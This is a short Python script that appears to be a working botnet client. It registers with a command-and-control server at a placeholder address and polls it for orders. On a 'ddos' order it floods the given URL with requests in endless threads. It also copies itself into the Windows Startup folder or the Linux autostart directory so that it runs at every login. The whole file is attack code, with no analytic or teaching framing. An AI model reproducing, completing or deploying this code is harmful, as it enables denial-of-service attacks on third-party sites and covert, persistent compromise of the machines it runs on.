
import requests,os,time,random,threading,subprocess,platform
C2="https://your-c2-server.com"
BID=platform.node()+str(os.getpid())
UA=["Mozilla/5.0","Chrome/120","Edge/120"]
def atk(url):
    while True:
        try:
            r=requests.get(url,headers={"User-Agent":random.choice(UA)})
            print(f"atk {r.status_code}")
        except:pass
def reg():
    try:requests.post(f"{C2}/reg",json={"id":BID})
    except:pass
def loop():
    while True:
        try:
            c=requests.get(f"{C2}/cmd/{BID}",timeout=5)
            if c.status_code==200:
                j=c.json()
                if j["t"]=="ddos":threading.Thread(target=atk,args=(j["url"],)).start()
        except:pass
        time.sleep(3)
reg()
threading.Thread(target=loop).start()
# Self-replicate
p=os.path.abspath(__file__)
if platform.system()=="Windows":
    d=os.path.join(os.getenv("APPDATA"),"Microsoft","Windows","Start Menu","Programs","Startup","sys.py")
else:
    d=os.path.expanduser("~/.config/autostart/bot.py")
    os.makedirs(os.path.dirname(d),exist_ok=True)
if not os.path.exists(d):
    with open(p) as s:open(d,'w').write(s.read())
